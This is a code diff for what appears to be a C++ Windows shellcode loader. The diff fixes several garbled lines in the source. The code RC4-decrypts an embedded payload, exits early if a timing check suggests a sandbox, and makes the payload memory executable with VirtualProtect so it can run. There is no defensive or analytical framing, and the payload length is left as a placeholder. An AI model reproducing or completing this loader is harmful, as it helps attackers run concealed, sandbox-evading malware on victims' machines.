@@ -8,6 +8,7 @@
 
 extern "C" void RunData();
 
+// Revert the RC4 encryption
 void rc4(unsigned char* data, int len, const char* key) {
 	int keylen = strlen(key);
 	unsigned char s[256];
@@ -17,9 +18,9 @@ void rc4(unsigned char* data, int len, const char* key) {
 
 	unsigned char j = 0;
 	for (int i = 0; i < 256; i++) {
-		j= (j + s[i] + key[i % keylen]) % 256;
+		j = (j + s[i] + key[i % keylen]) % 256;
 		unsigned char tmp = s[i];
-		s[il = s[j];
+		s[i] = s[j];
 		s[j] = tmp;
 	}
 
@@ -43,7 +44,7 @@ int main(int argc, char** argv){
 	auto end = std::chrono::system_clock::now();
 	std::chrono::duration<double> elapsed_seconds = end - start;
 	if (elapsed_seconds.count() <= 4.5) {
-		exit(e)
+		exit(0);
 	}
 
 	// Run our payload function
@@ -51,7 +52,7 @@ int main(int argc, char** argv){
 	int len = 0x0x0x0x; // modify with payload length
 
 	DWORD oldProtect = 0;
-	if (IVirtualProtect((LPVOID)SunData, len, PAGE_EXECUTE READWRITE, &oldProtect)) {
+	if (!VirtualProtect((LPVOID)&RunData, len, PAGE_EXECUTE_READWRITE, &oldProtect)) {
 		printf("Error: %d", GetLastError());
 	}
 
